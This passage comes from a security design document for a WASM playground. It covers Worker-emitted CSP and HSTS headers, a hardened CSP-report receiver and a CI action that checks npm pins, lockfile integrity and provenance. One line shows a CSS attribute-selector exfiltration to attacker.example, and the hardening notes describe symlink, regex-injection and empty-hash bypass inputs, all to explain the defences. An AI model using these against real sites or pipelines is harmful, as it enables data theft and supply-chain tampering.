     | Respond with `204 No Content` and EMPTY body, NO custom response headers | Any reflected request data — body OR headers (e.g. echoing `Content-Type`, setting `Location` from a report field) — becomes an injection sink. Emit only `Content-Length: 0`. |
     | NEVER reflect any report field into a response header, response body, log search facet, or downstream forwarder without per-sink escaping | The "treat as attacker-controlled" rule is per-sink, not per-receiver. |
     | `document-uri` may carry query-string params and fragments | Strip or hash query strings + fragments server-side before persisting if the playground URL is ever expected to carry secrets. (Current playground URL is static — residual risk zero today; documented for future maintainers.) |

   **Operator-deployment options (any of these works):**

   - *Self-hosted minimal collector (~30 lines).* A Cloudflare Worker
     / AWS Lambda / Vercel Edge Function / Netlify Function that
     accepts POST, parses JSON, appends to a log sink (Cloudflare
     R2 / S3 / Datadog / loki). No vendor dependency beyond the
     hosting platform itself.
   - *Third-party reporting service.* `report-uri.com`, Sentry's
     security report endpoint, Datadog RUM, etc. Faster to ship,
     introduces a vendor — opaque-response cross-origin reports
     have lower fidelity than same-origin (browsers strip some
     fields cross-origin); see the validator's cross-origin WARN.
     If you go this route, override the meta-tag CSP via an
     HTTP-header-mode CSP at the hosting layer rather than editing
     the page bytes (keeps page-bytes deployment-agnostic).
   - *No receiver at all.* Browsers POST to a 404; the violation is
     still blocked, but the report is lost. Acceptable for
     local-dev or a soft-launch where DevTools-Network is the
     monitoring surface; not acceptable for a hosted production
     playground.

   **Why `report-uri` (deprecated in CSP3) and not `report-to`?** The
   modern Reporting API uses `report-to <group>` in CSP referencing
   a `Reporting-Endpoints: <group>="<url>"` HTTP header. The header
   CANNOT be delivered via `<meta http-equiv>`, so meta-tag-CSP
   delivery is incompatible with `report-to`. `report-uri` works in
   meta-tag delivery and is supported by every current browser
   (Chrome, Firefox, Safari, Edge as of 2026). A header-mode-CSP
   deployment SHOULD ALSO declare `report-to` + `Reporting-Endpoints`
   for forward-compat (the Reporting API supports batching, retries,
   and other report types beyond CSP — network errors, deprecation,
   intervention) but neither breaks if the other is absent.

   **Graceful degradation if `report-uri` is removed.** `report-uri`
   has been marked deprecated in CSP3 since 2018; no major browser
   has removed it (Chrome's removal intent was withdrawn) and all
   four ship-it as of 2026. If a future browser does remove the
   directive, the failure mode is silent loss of reports — CSP
   enforcement is unaffected, violations are still BLOCKED, only the
   POST disappears. Operators relying on reports for incident
   detection should monitor browser deprecation timelines and add
   `report-to` + `Reporting-Endpoints` at the HTTP-header layer
   before any browser removes `report-uri`.

   **F-3 closure framing.** Welle B installs the *plumbing* for
   reporting; *visibility* requires the operator to also stand up a
   receiver matching the spec above. Without a receiver, the page
   is "receiver-ready" but reports POST into a 404 (violation still
   blocked, report lost). The F-3 gap from Welle A is closed at the
   page-bytes layer; **Welle C closes it at the deployment layer
   too — see bullet 7 below**.

7. **Workers + Static Assets host with Worker-emitted security
   headers, executable receiver, and AE+R2 archive (V1.16 Welle C).**
   The playground deploys to a single Cloudflare Worker that hosts
   the static-asset bundle (`apps/wasm-playground/` → `index.html`,
   `app.js`, `pkg/*.wasm` + glue), the CSP-report receiver, and a
   daily archive cron — `apps/wasm-playground/wrangler.toml` and
   `apps/wasm-playground/worker/src/`. Every response — static asset
   2xx, asset-binding 404, receiver 204 — passes through
   `applySecurityHeaders` (`worker/src/security-headers.ts`) and
   carries:

   - **`Content-Security-Policy` HTTP header** with the same eight
     directives as the page-bytes meta-tag (`default-src`,
     `script-src` w/ SRI hash matching `app.js`, `style-src`,
     `connect-src`, `form-action`, `frame-ancestors 'none'`,
     `base-uri 'none'`, TT enforcement) PLUS `report-uri /csp-report`
     and `report-to reports` AND a `Reporting-Endpoints: reports="
     /csp-report"` companion header — `frame-ancestors` is now
     header-delivered so meta-tag-only browsers no longer ignore it,
     and the modern Reporting API has its required header partner
     for forward-compat.
   - **`Strict-Transport-Security: max-age=31536000; includeSubDomains;
     preload`** — HSTS preload-eligible, blocks SSL-stripping, locks
     the host into HTTPS for at least one year per browser.
   - **`Cross-Origin-Opener-Policy: same-origin`** + **`Cross-Origin-
     Embedder-Policy: require-corp`** — Spectre / cross-window leak
     defence; isolates the page's browsing context group.
   - **`X-Content-Type-Options: nosniff`** + **`Referrer-Policy:
     no-referrer`** — also as HTTP headers (the meta-tag versions stay
     for page-bytes-only fallback paths).
   - **Per-path Cache-Control:** `no-cache, must-revalidate` on `/`
     and `/index.html` (small, must reflect the latest CSP); `public,
     max-age=31536000, immutable` on `/app.js` (SRI-pinned; bytes
     change ⇔ pin changes ⇔ URL must invalidate); `public, max-age=
     31536000, immutable` on `/pkg/*.wasm` + `/pkg/*.js` (content-
     hashed by wasm-bindgen build pipeline); `no-store` on the
     `/csp-report` 204.

   The `experimental_serve_directly = false` + `run_worker_first =
   true` flags in `wrangler.toml` (set both for cross-version
   wrangler compat) force the Worker to run BEFORE the static-asset
   match — without these, Cloudflare's edge would serve assets
   directly and bypass `applySecurityHeaders`, defeating the entire
   layering. The flag invariant is verified post-deploy by the
   live-check validator (`tools/playground-csp-check.sh
   --live-check <url>`, see Anti-drift below).

   **Receiver implementation (`worker/src/csp-receiver.ts`).** An
   executable form of the receiver-shape spec from bullet 6: silent-
   204 on every validation failure (no oracle for attackers — they
   cannot distinguish origin-mismatch from rate-limit from schema-
   fail), categorised internal `console.error` JSON line on every
   failure (visible to operators via `wrangler tail` / CF Workers
   logs but never to the caller). Pipeline:

   1. Origin check (CSRF anchor — silent-204 if Origin is absent,
      `null`, or != `EXPECTED_ORIGIN`).
   2. Content-Type allow-list (`application/csp-report`,
      `application/json`, `application/reports+json`; case-
      insensitive; suffix-tolerant for `; charset=utf-8`).
   3. Body-size pre-check from `Content-Length` (≤ 64 KB).
   4. Body-size post-check after read (≤ 64 KB).
   5. Depth-limited JSON parse (`worker/src/json-safe-parse.ts`) —
      per-receiver tight limits `{ maxDepth: 4, maxKeysPerObject: 24,
      maxStringLength: 8192 }` with structural pre-scan that rejects
      depth-bombs before `JSON.parse` ever sees the input.
   6. Schema extraction (legacy `{csp-report: {...}}`, modern
      Reporting API array `[{type, body: {...}}]`, direct top-level
      shape — all three accepted).
   7. Rate-limit check (post-validation — only valid reports count
      against the cost budget): per-IP-prefix `100/min` (IPv6 /64,
      IPv4 /32) AND global `1000/min`, both via a single Durable
      Object (`worker/src/rate-limit.ts` `GlobalRateLimitDO`).
      DO unavailable → fail-closed silent-204.
   8. Field normalisation: ANSI-strip every string, allow-list
      fields, truncate to `MAX_FIELD_LENGTH = 1024`
      (`MAX_ORIGINAL_POLICY_LENGTH = 2048`), URL fields → origin
      only (drop path/query/fragment), `source-file` → basename
      only, line/col floored + clamped non-negative.
   9. `writeDataPoint` to Workers Analytics Engine with
      `indexes = [violatedDirective]`, 7 blobs, 2 doubles. AE
      throws → silent-204 (no caller-visible oracle).

   The receiver NEVER stores or echoes the raw report body — only
   the normalised, allow-listed, ANSI-stripped struct enters AE.
   Method enforcement is the router's job (`worker/src/index.ts`
   only routes POST to the receiver); the receiver itself omits a
   defence-in-depth method-check on purpose because a 405 would
   break the silent-204 invariant.

   **AE → R2 daily archive (`worker/src/cron-archive.ts`).** A
   single cron at `0 3 * * *` UTC writes one R2 object per day under
   `heartbeat/<YYYY-MM-DD>.json`. R2 `Class-A` ops are charged
   per-PUT, so one PUT/day instead of one PUT/report — defends
   against an AE-write-spam financial-DoS amplification. Today the
   handler writes a heartbeat marker; the AE → R2 query-and-batch
   step is wired in but parameterised so adding the actual datapoint
   pull later is a one-line change. R2 lifecycle (operator-side, set
   in CF dashboard or via API) deletes objects > 365 days.

   **Test discipline.** `worker/test/` runs under
   `@cloudflare/vitest-pool-workers` with miniflare bindings —
   91 tests covering Origin/CT/body-cap/JSON-bomb/schema/rate-
   limit/normalisation/AE-write/cron-archive in unit form, plus
   end-to-end SELF.fetch integration tests for the router and
   security-header layering invariant. The pool's v0.5.41
   limitation that strips
   `assets.routingConfig.invoke_user_worker_ahead_of_assets` is
   worked around by calling `worker.fetch` directly with a mock
   ASSETS binding for the static-asset tests; the real flag is
   verified at deploy time by the live-check validator.

### What scope-d does NOT cover

- ~~`report-to` / `Reporting-Endpoints` HTTP header config~~ —
  **CLOSED in Welle C.** The Worker now emits `report-to reports` in
  the HTTP-header CSP and the matching `Reporting-Endpoints:
  reports="/csp-report"` companion header. Both delivery modes
  (`report-uri` from the page-bytes meta-tag AND `report-to` from
  the Worker-emitted header) point at the same receiver.
- ~~Receiver implementation~~ — **CLOSED in Welle C.** An
  executable form of the receiver-shape spec ships at
  `worker/src/csp-receiver.ts` with all defences from the spec
  table operationalised (silent-204, Origin anchor, CT allow-list,
  body cap, JSON-bomb defence, schema extract, rate-limit, ANSI-
  strip + field allow-list, AE persistence). Out-of-the-box
  behaviour matches the receiver-shape spec without operator
  customisation.
- ~~Report-spoofing protection~~ — **CLOSED in Welle C** at the
  receiver layer: per-IP `/64` prefix rate-limit (defeats the
  trivial IPv6 `::1` rotation), global cap (defeats large
  botnets), Origin anchor (defeats most cross-origin spoofing),
  schema rejection of unknown shapes (drops malformed payloads
  before AE write).
- **CSS data exfiltration via attribute selectors.** With `style-src
  'self' 'unsafe-inline'`, an attacker who manages to inject CSS
  (e.g. through a hypothetical future `<style>` tag injection that
  bypasses sink discipline at the HTML level) can use attribute
  selectors like `input[value^="abc"] { background-image:
  url(//attacker.example/exfil); }` to leak the contents of input
  fields character-by-character. The current playground has no
  `<input type="text">` fields with sensitive values (only file
  pickers, which don't expose `value` attributes), so the practical
  residual risk is zero. Documented for future maintainers: if a
  text-input field is ever added with sensitive data, this gap
  becomes load-bearing and `style-src 'self' 'unsafe-inline'` must
  be re-evaluated against a hash-CSP or external stylesheet
  alternative.
- **WASM-binary SRI.** The verifier `.wasm` blob is fetched by the
  `wasm-pack`-emitted glue via `WebAssembly.instantiateStreaming`,
  which has no declarative SRI hook. The
  [`WebAssembly.compile` integrity-check spec](https://github.com/WebAssembly/spec/issues/1) is
  proposal-stage; until browsers ship it, the WASM binary is protected
  only by `script-src 'self'` + `connect-src 'self'` (same-origin
  policy). For V1.17+, two paths are open: (a) wait for the spec,
  (b) wrap the loader in a custom fetch that compares the SHA-256 of
  the response bytes against a pinned hash before calling
  `WebAssembly.compile`. Path (b) is implementable today but adds a
  per-build hash-update friction we want to defer until there is an
  active hosting deployment to justify it.
- **Service-worker pinning.** A future hosted playground could ship a
  service worker that intercepts all asset fetches and serves only the
  pinned set (rejecting any unknown URL). Out of scope until a hosting
  decision lands.
- **JS-side input-size cap.** The Rust verifier already caps allocation
  via `MAX_ITEMS_PER_LEVEL = 10_000` and rejects unknown fields, so a
  multi-GB malicious blob fails the parse rather than running the
  browser tab out of memory. A JS-layer pre-check (`File.size > N`
  before `file.text()`) would short-circuit before the WASM call but
  is cosmetic — the verifier itself does not need it for correctness.
- **Server-side `Content-Security-Policy` HTTP header.** Out of scope
  for the playground bytes themselves; a hosting deployment SHOULD
  also send the same policy as a header to honour `frame-ancestors`.
  Documented as an operator responsibility, not a code property.
- ~~Hosting decision and Cache-Control choice~~ — **CLOSED in
  Welle C.** Cloudflare Workers + Static Assets is the chosen host;
  Cache-Control is set per-path by `applySecurityHeaders` (no-cache
  on HTML, immutable on hashed assets, no-store on the receiver
  204). The DNS-pinning side (CAA records, Null-MX, DMARC, SPF,
  DNSSEC chain-of-trust) remains an operator-side step — not code,
  not page-bytes; documented in `docs/V1.16-WELLE-C-PLAN.md`
  Phase 4.2.

### Anti-drift

- `tools/playground-csp-check.sh` (CI mode, no flags) re-asserts the
  CSP directives, the `app.js` SRI hash, the wasm-bindgen-glue
  TT-compat audit, the `report-uri` declaration + same-origin shape
  (V1.16 Welle B), and exits non-zero on any drift.
- `tools/playground-csp-check.sh --live-check <url>` (V1.16 Welle C)
  validates the **deployed** Worker against `<url>` post-deploy:
  HTTP-header CSP (both `report-uri /csp-report` and `report-to
  reports`) consistent with the meta-tag CSP, `Reporting-Endpoints:
  reports="/csp-report"` companion present, HSTS preload-eligible
  (`max-age >= 31536000` + `includeSubDomains` + `preload`), COOP =
  `same-origin`, COEP = `require-corp`, X-CTO = `nosniff`,
  Referrer-Policy = `no-referrer`, per-path Cache-Control on `/`
  vs `/app.js`, and `POST /csp-report` returns 204 — i.e. every
  Welle C invariant is asserted live against the production Worker
  with `curl`. Mandatory after every `wrangler deploy`.
- `tools/git-hooks/pre-commit` + `tools/install-git-hooks.sh`
  (V1.16 Welle C) — repo-tracked git hook activated by
  `bash tools/install-git-hooks.sh` (one-time per clone, points
  `core.hooksPath` at `tools/git-hooks/`). Runs the validator
  whenever a commit touches `apps/wasm-playground/app.js`,
  `index.html`, or the wasm-bindgen glue, blocking the commit
  on drift. Replaces the manual `.git/hooks/pre-commit` snippet
  recommended in Welle A; auditable and cloned-in.
- `apps/wasm-playground/app.js:1-19` documents the sink discipline
  (`textContent`, `className`, `style.display` only). A reviewer
  introducing `innerHTML` / `eval` / `new Function` / `setTimeout(str)`
  / `*.src = userInput` should see this file header first.
- `apps/wasm-playground/index.html:7-103` documents each CSP directive
  inline (including `report-uri` rationale) so the policy is not a
  magic string.
- `apps/wasm-playground/worker/src/security-headers.ts` is the
  audit-fähig single source of truth for Worker-emitted headers; the
  meta-tag CSP and the HTTP-header CSP must stay byte-consistent on
  the eight shared directives. The live-check validator enforces
  this on every deploy.
- **SRI foot-gun mitigation.** Editing `app.js` without re-running
  `tools/playground-csp-check.sh --update-sri` produces a silent
  page-load failure on the next browser visit. With the V1.16
  Welle C pre-commit hook installed, this is now caught at commit
  time, not at deploy time; operators who skipped the one-time
  `bash tools/install-git-hooks.sh` install fall back to the Welle A
  workflow (CI on push as the second backstop).
- **Worker test discipline.** `apps/wasm-playground/worker/test/`
  must stay green (`cd apps/wasm-playground/worker && npx vitest
  run` + `npx tsc --noEmit`) — 91 tests covering every receiver
  failure mode, the silent-204 invariant, the rate-limit DO, the
  cron-archive heartbeat, and the security-header layering invariant.
  Run before any `wrangler deploy`.

### Trust composition with V1.5 byte-determinism + V1.14 Scope E SLSA L3

scope-d is delivery-side hardening. It composes with — does not replace
— the existing trust roots:

| Layer | What it pins | Failure mode addressed |
|---|---|---|
| V1.5 `signing_input_byte_determinism_pin` | CBOR signing-input bytes | issuer-side encoding drift |
| V1.14 Scope E SLSA L3 OIDC provenance | npm tarball bytes ↔ Git commit | npm-registry compromise |
| V1.15 Welle B GH-Releases backup | second tarball channel | npm-registry outage |
| V1.15 Welle C consumer pinning | lockfile integrity hash | local install drift |
| **V1.16 scope-d (Welle A) CSP + SRI + TT** | **playground `app.js` bytes + browser sink discipline** | **UI-side injection in a hosted deployment** |
| **V1.16 scope-d (Welle B) `report-uri`** | **post-block visibility into CSP violations** | **silent in-prod CSP failures (XSS attempts, accidental sink introduction, mis-config)** |
| **V1.16 scope-d (Welle C) Worker-emitted headers + executable receiver + AE→R2 archive** | **HTTP-layer hardening (HSTS preload, COOP, COEP, header-mode CSP so `frame-ancestors` takes effect, per-path Cache-Control) + receiver implementation matching the spec from Welle B** | **CDN/proxy strip of meta-tag-only directives, network-side SSL stripping, cross-window leak via Spectre, naive receiver becoming an attack surface, per-IP rate-limit bypass via IPv6 `/64` rotation, financial-DoS via per-report R2 writes** |
| **V1.17 scope-k (Welle A) consumer-side auto-verify CI Action** | **all three CONSUMER-RUNBOOK §1 trust layers (version pin → lockfile integrity → SLSA L3 provenance) re-asserted on every consumer CI build via `verify-wasm-pin-check@v1`** | **consumer follows runbook once at install time, then forgets to re-verify on every CI run — silent window where a maintainer-token-compromise can land between two installs and only be caught at the next manual quarterly audit** |

Each layer guards a different boundary; an attacker has to defeat all
eight to land a forged-trace-as-valid result against an operator using
the playground. Welle B pins *visibility* (without it, the other layers
fire silently and operators have no incident-detection signal from the
browser side); Welle C pins the *delivery channel* (HTTP-layer
hardening that the page-bytes alone cannot enforce) AND ships the
receiver that turns Welle B's plumbing into an actual incident-
detection signal. V1.17 Welle A pins the *consumer-side cadence* —
without it, every layer above is checked once at install time and
then assumed to hold across every subsequent CI build; with it, every
layer is re-asserted on every install with no possibility of skipping
a step or forgetting the audit ceremony.

The verifier crates (`atlas-trust-core`, `atlas-verify-cli`,
`atlas-verify-wasm`, `atlas-signer`) are licensed Apache-2.0. An auditor
or regulator who receives an Atlas trace bundle is free to fork, build,
and run them under Apache-2.0, with no obligation under the
Sustainable Use License that governs the server, web frontend, and MCP
server in `apps/`.

This is the load-bearing trust property of Atlas: any third party can
independently verify a trace bundle without buying anything from us.

---

## scope-k — Consumer-side auto-verify CI Action (V1.17 Welle A — shipped)

CONSUMER-RUNBOOK §1 (V1.15 Welle C) defines the three-layer trust
stack that downstream npm consumers of `@atlas-trust/verify-wasm` are
expected to maintain: (1) exact-version pin in `package.json`, (2)
lockfile integrity hash, (3) SLSA L3 provenance via `npm audit
signatures`. The runbook walks through the install-time ceremony and
the operator-side composition table at §7. **scope-k closes the
structural failure mode that the runbook by itself does not address:
the consumer follows the ceremony once at install time, then forgets
to re-verify on every CI build.** The action is the executable form of
the runbook ceremony.

Threat addressed:

- **F-4 (consumer-side cadence drift).** A consumer follows
  CONSUMER-RUNBOOK §2 / §5 once at install time. They commit a
  correctly-pinned `package.json` + a lockfile with an `integrity`
  field + a one-time `npm audit signatures` log line in the CI
  pipeline output. Six months later, an attacker compromises a
  maintainer token (Layer 3's threat) and publishes a malicious
  `1.15.99`. The consumer's `package.json` is pinned to `1.15.0` so
  the attack does not auto-land. But: a junior developer files a
  PR that bumps to `^1.16.0` for a feature, which on merge silently
  resolves to the malicious version. The lockfile-integrity check
  passes (the new version's bytes are self-consistent), the audit-
  signatures step is missing from the PR's CI lane (it was only
  added to the original install commit and never enforced as a gate
  on every build), and the malicious bytes land in the consumer's
  next deploy. **scope-k closes F-4 by making all three layers a
  single one-line CI step that cannot be omitted without removing
  it from the workflow file.**

What scope-k ships:

1. **`.github/actions/verify-wasm-pin-check/action.yml`** — a
   composite action with five sequential `shell: bash` steps:
   setup → Layer 1 → Layer 2 → Layer 3 → summary. Inputs:
   `package-name` (default `@atlas-trust/verify-wasm`), `expected-version`
   (optional bare semver, asserts exact match), `package-manager`
   (`auto` / `npm` / `pnpm` / `bun`), `working-directory`,
   `skip-provenance` (default `false`), `fail-on-local-file`
   (default `false`, promotes V1.15 Welle B backup-channel `file:`
   resolved entries from WARN to FAIL), `provenance-retries`
   (default 3, exponential backoff 10s / 30s / 90s on transient
   Sigstore Rekor outages).
2. **`scripts/check-version-pin.sh`** — Layer 1 implementation.
   Parses `package.json` via `node -e` (env-var-passed for shell-
   escape safety), iterates all four dep buckets (`dependencies`,
   `devDependencies`, `peerDependencies`, `optionalDependencies`),
   rejects any value matching `^*`, `~*`, `>*`, `<*`, `=*`, `**`,
   `*||*`, `x` / `X` / `*.x`, `latest` / `next`, `workspace:`,
   `file:`, `link:`, `git+`, `github:`, `http:`, `https:`. Bare-
   semver shape check (`[0-9]+.[0-9]+.[0-9]+` with optional
   `-rc.N` / `+sha.abc` suffix) rejects any non-semver value that
   slipped past the bucket scan.
3. **`scripts/check-lockfile-integrity.sh`** — Layer 2 router that
   dispatches to PM-specific helpers (`-npm.sh`, `-pnpm.sh`,
   `-bun.sh`, `-bun-text.sh`). Each helper validates that the
   `integrity` field exists, has a strong-hash prefix
   (`sha512-` / `sha384-` / `sha256-` are OK; `sha1-` / `md5-` are
   HARD FAIL — collisions are practical against sha1 and don't
   defend against registry-side replacement), and the `resolved`
   URL has an HTTPS origin (canonical `registry.npmjs.org` is
   silent-OK; corporate-mirror HTTPS hosts emit a WARN so the
   integrity hash being mirror-served is visible; `file:` is the
   V1.15 Welle B backup-channel state — WARN by default, HARD FAIL
   with `fail-on-local-file: true`). The npm helper supports
   `lockfileVersion` 1 (`dependencies` recursive tree), 2, and 3
   (`packages` map). The pnpm helper uses a state-machine awk
   parser for `pnpm-lock.yaml` block boundaries (no YAML library
   dependency). The bun-text helper parses `bun.lock` JSONC via a
   string-aware tokenizer (NOT a regex — a regex `//[^\n]*` would
   mis-treat `//` inside a URL like `"https://registry.npmjs.org/..."`
   as a line-comment start; the tokenizer tracks `inString` state
   with backslash-escape handling to avoid this class of bug).
4. **`scripts/check-provenance.sh`** — Layer 3 implementation.
   Validates `npm` is on PATH and version ≥ 9.5 (the version that
   introduced the attestation API; older npm silently lacks the
   `signatures` subcommand). Runs `npm audit signatures` with
   exponential-backoff retry on transient classifications
   (`ENOTFOUND` / `ECONNREFUSED` / `ETIMEDOUT` / `503` / `502` /
   `504` / `network` / `socket hang up` / `unable to verify`).
   Hard-fails immediately on `attestation-failure` /
   `signature-failure` classifications (cryptographic rejection —
   never transient). Asserts post-success that the output contains
   a `verified attestation` line AND the package is NOT in any
   failure context (an `audited 0 packages` empty-tree case would
   otherwise exit 0 silently — defence in depth).
5. **`scripts/lib/log.sh`** — `tput`-based ANSI colour with graceful
   degrade to plain text when no TTY (e.g. GitHub Actions
   `TERM=dumb` runs).
6. **`scripts/lib/detect-pm.sh`** — package-manager auto-detection
   with `npm > pnpm > bun` precedence, multi-lockfile WARN, and
   explicit override via `package-manager:` input.
7. **`test/fixtures/`** — 16 synthetic fixtures covering Layer 1
   pass/fail (caret / tilde / mismatched expected-version /
   package-not-installed / `dev-dependencies` bucket / pnpm /
   bun-text / npm v1 lockfile schema), Layer 2 pass/fail (missing
   integrity / sha1 weak hash / local-file backup-channel WARN
   path / `fail-on-local-file: true` HARD FAIL path / multi-lockfile
   auto-detect WARN), and the matching expected-version exact-match
   path.
8. **`test/run-tests.sh`** — fixture-based harness running 36 cases
   covering every fixture × script combination. Asserts exit code
   only (output strings are user-facing copy and may change without
   altering the contract); on mismatch, dumps the captured stderr+
   stdout for debug. Runs in ~30 seconds, no network.
9. **`.github/workflows/verify-wasm-pin-check-self-test.yml`** — CI
   workflow with four jobs: `fixture-unit-tests` (runs the harness),
   `action-fixture-invocation` (`uses:` the action against
   Layer-2-passing fixtures via the GitHub Actions runtime),
   `action-negative-cases` (negative-path matrix with
   `continue-on-error: true` + `outcome != 'failure'` assertion),
   and `live-install-layer-3` (real `npm install --save-exact
   @atlas-trust/verify-wasm@latest` + Sigstore round-trip). The
   live-install job runs on weekly cron at `Mon 06:17 UTC` to catch
   Sigstore regressions independent of code changes.
10. **`README.md`** in the action directory — consumer-facing
    docs covering threat model, full input surface, recommended
    pinning posture (commit-SHA over `@v1.17.0` tag), composition
    with `npm ci` / `pnpm install --frozen-lockfile`, and the
    self-test workflow structure.

Adversarial-input hardening (post-review-pass defences applied
before V1.17 Welle A shipped — every one is a defence against an
attacker who controls the consumer's `package.json`, lockfile, or
the action's own input plumbing):

- **`scripts/lib/canonicalize-workdir.sh`** — sourced by every
  layer script. `realpath`s the `working-directory` input and
  (when `$GITHUB_WORKSPACE` is set, i.e. running in GitHub
  Actions) asserts the resolved path is contained within the
  workspace root. Defends against a fork-PR-poisoning scenario
  where a malicious PR commits a symlink at the consumer-supplied
  path (`packages/foo` → `../../../../etc`) so the action would
  `cd` outside the checkout root. Per-script sourcing is
  load-bearing because composite-action `env:` blocks re-evaluate
  `${{ inputs.working-directory }}` for every step — a single
  `$GITHUB_ENV` write from setup.sh would be silently overridden.
- **AWK regex-injection defence in pnpm helper.** The original
  pnpm parser used the `~` regex-match operator and dynamic
  `sub()` with the package-name interpolated into the pattern. A
  consumer (or fork-PR author) supplying `package-name` with
  AWK regex metacharacters (`.`, `+`, `*`, `[`, `^`, `$`, `|`,
  `(`, `\`) could either crash AWK (DoS the integrity check
  entirely → fail-open if subsequent layer state is mishandled)
  or cause the regex to match an unintended lockfile entry with a
  valid integrity hash (Layer 2 silent pass on a substituted
  package). Replaced with `index()` (literal substring match) +
  `substr()`-based prefix-stripping — no regex engine ever sees
  the user-supplied name.
- **`bun pm ls --json` size cap + iterative walk + `WeakSet`
  visited-set.** A maliciously-crafted `bun.lockb` could cause
  `bun pm ls --json` to emit gigabyte-scale output. We cap the
  shell-variable size at 10 MB before passing to node (defends
  against runner OOM and Linux ARG_MAX truncation). The Node-
  side `walk()` is iterative (queue-based) instead of recursive
  to defend against an adversarially-deep dependency tree
  triggering V8 stack overflow (`RangeError: Maximum call stack
  size exceeded`). `WeakSet`-based cycle detection defends
  against peerDep cycles in the bun output. Same defence applies
  to the bun-text JSONC parser via the existing 10 MB shell-
  variable upper bound (no separate cap needed there since
  `bun.lock` is checked-in repo content, not bun-runtime output).
- **Layer 3 `npm ls` pre-condition** (`scripts/check-provenance.sh`).
  `npm audit signatures` reports counts in the success case
  (`N package(s) have a verified attestation`), NOT per-package
  verdicts. A tree where our package is NOT installed but other
  packages ARE signed would have passed Layer 3 silently — the
  positive grep would match the unrelated package's count line.
  Pre-conditioning Layer 3 with `npm ls "$PACKAGE" --depth=0`
  asserts our package is in the resolved install tree before the
  audit step runs, closing the false-pass gap.
- **ASCII Unit Separator (`\x1f` / octal `\037`) field-passing in
  every script.** The bash `read` builtin merges consecutive
  whitespace IFS chars (tab, space, newline) — so an empty middle
  field in a tab-separated tuple would shift all trailing fields
  one column left, silently masking an integrity-failure as a
  resolved-URL field check. `\x1f` is the canonical C-locale
  field-separator char and never appears in any realistic
  lockfile content; AWK output uses the octal `\037` escape for
  portability (gawk supports `\x` but mawk and busybox awk only
  speak octal). Applied in `check-version-pin.sh` (BUCKET ↔
  VERSION) AND every Layer 2 helper (KEY ↔ VERSION ↔ RESOLVED ↔
  INTEGRITY). The version-pin script's original `:` separator
  would have corrupted any future package-name input containing
  a colon (e.g. an `npm:other-pkg@1.0.0` alias spec — rejected
  by the range check, but only if the field-split runs cleanly
  first).
- **String-aware JSONC tokenizer in bun-text helper.** The Node-
  side fallback parser walks the input character by character,
  tracking `inString` state with backslash-escape handling. A
  regex-based JSONC stripper (`/\/\/[^\n]*\n/g`) would mistakenly
  treat `//` inside a URL string like
  `"https://registry.npmjs.org/..."` as the start of a line
  comment, eat the rest of the JSON, and produce a parse error
  that makes the helper fail-open or report a bogus diagnostic.
  The tokenizer tries plain `JSON.parse` first (bun emits valid
  JSON in current versions) and only falls back to JSONC stripping
  on failure — defence-in-depth without paying tokenizer cost on
  the common path.
- **SHA-pinned `actions/checkout` + `actions/setup-node` in the
  self-test workflow.** The self-test workflow is itself the
  enforcement mechanism for V1.17's supply-chain hardening claim.
  Depending on a mutable `@v4` tag for `actions/checkout` would
  be self-undermining — a tag-rewrite or upstream compromise
  could inject code into the very workflow that proves the action
  works. Both pinned to commit SHA with `# v4.x.y` comment so
  future audits can verify the pinned commit matches the labelled
  release.
- **`bun pm ls` stderr capture.** Original implementation silenced
  stderr with `2>/dev/null` — a non-zero bun exit would produce
  the opaque "no output" diagnostic. Now captures both streams
  via the `BUN_RC=0; ... || BUN_RC=$?` pattern so the consumer
  sees the real bun error message on a CI fail.
- **Layer 3 grep is case-insensitive (`grep -iF` / `grep -iE`).**
  Defends against a future npm output-format change that may
  alter casing of failure verbs ("Missing" vs "missing", etc.).
  Also extended the failure-context vocabulary to include `error`
  and `untrusted` in addition to `missing|invalid|failed`.
- **bun-text fixture corrected.** The `bun-text-no-integrity-bad`
  fixture originally had `[..., {}]` as the last element — the
  Node parser converted the `{}` object to `"[object Object]"`,
  failing the `sha512-` prefix check with a misleading "unrec-
  ognised hash format" diagnostic. Changed to `[..., ""]` so the
  test exercises the genuine "missing integrity" code path with
  the correct diagnostic.

Post-review hardening pass (second iteration, 2026-05-05 — the
shipped V1.17 Welle A code was re-reviewed in parallel by
`code-reviewer` + `security-reviewer` after first ship; the
following defences close residual gaps that survived the first
pass):

- **Per-algo minimum-payload-length check on every lockfile
  integrity hash.** The first-pass implementation accepted any
  string with the prefix `sha512-` / `sha384-` / `sha256-`. Bash
  glob `sha512-*` matches `sha512-` itself (zero chars after the
  dash). An attacker with lockfile-write access (compromised
  branch, fork-PR, malicious dependency-bot rewrite) could write
  `"integrity": "sha512-"` and Layer 2 would silently pass — `npm
  install` is permissive about empty integrity values in some
  edge cases, so the subsequent install would not necessarily
  block. Now every Layer-2 helper enforces the *base64-of-SHA*
  minimum payload length: sha256 needs ≥51 base64 chars (32 raw
  bytes), sha384 needs ≥71 (48 raw), sha512 needs ≥95 (64 raw).
  Any shorter payload HARD-FAILs with `weak-hash` diagnostic.
  Applied identically in `check-lockfile-integrity-npm.sh`,
  `check-lockfile-integrity-pnpm.sh`, `check-lockfile-integrity-bun.sh`,
  `check-lockfile-integrity-bun-text.sh`. New fixture
  `npm-empty-hash-payload/` exercises the bypass attempt; harness
  asserts Layer 1 passes (fixture has a clean `1.15.0` exact pin)
  AND Layer 2 hard-fails.
- **npm hyphen-range Layer-1 rejection** (`check-version-pin.sh`).
  npm semver supports a hyphen-range syntax `"1.0.0 - 2.0.0"`
  meaning `>=1.0.0 <=2.0.0`. The first-pass range-rejection case
  statement matched `*"||"*`/`*">"*`/`*"<"*`/`*"="*` plus the
  star-arm `*\**`/`*x*` and the no-pin keywords `latest`/`next`,
  but had no arm for the literal pattern `"x.y.z - x.y.z"`. The
  spec contains spaces and a hyphen, neither of which trip any
  of the existing arms — so it would fall through to the bare-
  semver-shape glob (also negative, since `1.0.0 - 2.0.0` is not
  a single bare semver) and only THEN fail. Defence-in-depth: the
  hyphen-range form is now caught by an explicit `*" - "*` arm
  with a hyphen-range-specific diagnostic (vs. the generic
  "not a bare semver" message), so a future refactor of the
  semver-shape glob can't accidentally re-open the bypass.
  Diagnostic message updated to enumerate hyphen-range alongside
  caret/tilde/`||` for consumer clarity. New fixture
  `npm-hyphen-range-bad/` exercises the rejection.
- **Iterative npm v1 lockfile walk + 10 MB file-size cap**
  (`check-lockfile-integrity-npm.sh`). The first-pass implementation
  was iterative for the v7+ `packages` map but recursive for the
  v6 `dependencies` tree (load-bearing for `lockfileVersion: 1`
  consumers — npm v6 tooling still emits this shape, and v7+ npm
